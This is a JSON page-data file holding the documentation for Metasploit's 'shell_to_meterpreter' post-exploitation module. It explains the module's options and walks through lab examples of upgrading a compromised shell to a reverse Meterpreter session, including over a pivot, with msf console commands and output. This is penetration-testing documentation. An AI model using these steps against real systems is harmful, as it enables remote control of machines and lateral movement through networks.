{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/manage/shell_to_meterpreter","result":{"data":{"moduleMetadataJson":{"id":"b52c9b57-9879-52f6-8b7f-6dd70a9c814e","name":"Shell to Meterpreter Upgrade","fullname":"post/multi/manage/shell_to_meterpreter","description":"This module attempts to upgrade a command shell to meterpreter. The shell\n          platform is automatically detected and the best version of meterpreter for\n          the target is selected. Currently meterpreter/reverse_tcp is used on Windows\n          and Linux, with 'python/meterpreter/reverse_tcp' used on all others.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/manage/shell_to_meterpreter","documentationSlug":"/modules/documentation/post/multi/manage/shell_to_meterpreter","referencesSlug":"/modules/references/post/multi/manage/shell_to_meterpreter"},"documentation":{"html":"<p><code class=\"language-text\">shell_to_meterpreter</code> allows you to upgrade a shell session to Meterpreter. It can be launched as\na post module, or from the <code class=\"language-text\">sessions</code> command. By default, this module will use a reverse\nMeterpreter.</p>\n<h2 id=\"important-options\" style=\"position:relative;\"><a href=\"#important-options\" aria-label=\"important options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Options</h2>\n<p><strong>HANDLER</strong></p>\n<p>The handler option is for starting a multi/handler to receive the connection. By default this is\ntrue, because you will need it. But if for some reason if you're setting one separately, you may\nwant to consider having it as false.</p>\n<p><strong>LHOST</strong></p>\n<p>The LHOST option is for the reverse Meterpreter you are upgrading to. By default, the module can\nfigure it out for you. But over a pivot, you will need to manually set this, because session\nobjects don't necessarily have that information.</p>\n<p><strong>LPORT</strong></p>\n<p>The LPORT option is also for the reverse Meterpreter you are upgrading to.</p>\n<p><strong>PAYLOAD_OVERRIDE</strong></p>\n<p>This is an advanced option. If you don't want to use the default reverse Meterpreter, then you can\nuse this.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Using sessions -u</strong></p>\n<p><code class=\"language-text\">sessions -u</code> is the same as running the post module against a specific session. However, this\nis limited to using the default reverse Meterpreter payload, so you will not be able to use it\nvia a pivot.</p>\n<p>Usage is rather simple. At the msf prompt, first off, read the sessions table to see which one you\nwant to upgrade:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; sessions\n\nActive sessions\n===============\n\n  Id  Type           Information  Connection\n  --  ----           -----------  ----------\n  1   shell windows               192.168.146.1:4444 -&gt; 192.168.146.128:1204 (192.168.146.128)\n\nmsf &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>In this demonstration, session 1 is a shell, so we upgrade that:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; sessions -u 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>Upgrading a shell via a pivot</strong></p>\n<p>This scenario is a little tricky, because the default options won't work over a pivot. The problem\nis that if you got a session with a bindshell, your LHOST will say \"Local Pipe\". And if you got it\nwith a reverse shell, the LHOST is actually an IP range. Neither is an acceptable format for the\nLHOST option.</p>\n<p>There are two ways you can choose: either you must manually set LHOST, or you could choose a\nbind Meterpreter. The second is really easy, all you need to do is <code class=\"language-text\">set PAYLOAD_OVERRIDE</code>.</p>\n<p>If you prefer to manually set LHOST, this should be the compromised host you're pivoting from.\nPerhaps a digram will help to explain this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">|-------------|       |-------------------|       |-------------------|\n|   Attacker  | &lt;---&gt; | Compromised box A | &lt;---&gt; | Compromised box B |\n|-------------|       |-------------------|       |-------------------|\n 192.168.146.1         192.168.146.128\n                       192.168.1.101 (VPN)          192.168.1.102(VPN)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>In this example, let's start with breaking into box A (192.168.146.128):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Sending stage (957999 bytes) to 192.168.146.128\n[*] Meterpreter session 1 opened (192.168.146.1:4444 -&gt; 192.168.146.128:1208) at 2016-04-28 22:45:09 -0500\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>We decide that box A is on a VPN, with IP 192.168.1.101. Also, we found box B as 192.168.1.102. We\nneed to create that pivot:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; route add 192.168.1.1 255.255.255.0 1\n[*] Route added</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>And we break into box B (192.168.1.102) with a Windows bind shell:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Command shell session 2 opened (Local Pipe -&gt; Remote Pipe) at 2016-04-28 22:47:03 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Notice this says \"Local Pipe\", which means the box B's session object doesn't really know box A's IP.\nIf you try to run shell<em>to</em>meterpreter this way, this is all you get:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(shell_to_meterpreter) &gt; run\n\n[*] Upgrading session ID: 2\n[-] LHOST is &quot;Local Pipe&quot;, please manually set the correct IP.\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To upgrade box B's shell, set LHOST to box A's 192.168.1.101. And that should connect correctly:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(shell_to_meterpreter) &gt; run\n\n[*] Upgrading session ID: 2\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 192.168.1.101:4433 via the meterpreter on session 1\n[*] Starting the payload handler...\n[*] Sending stage (957999 bytes) to 192.168.1.102\n[-] Powershell is not installed on the target.\n[*] Command stager progress: 1.66% (1699/102108 bytes)\n...\n[*] Command stager progress: 100.00% (102108/102108 bytes)\n[*] Meterpreter session 3 opened (192.168.146.1-192.168.146.128:4433 -&gt; 192.168.1.102:1056) at 2016-04-28 22:50:56 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"b52c9b57-9879-52f6-8b7f-6dd70a9c814e"}}}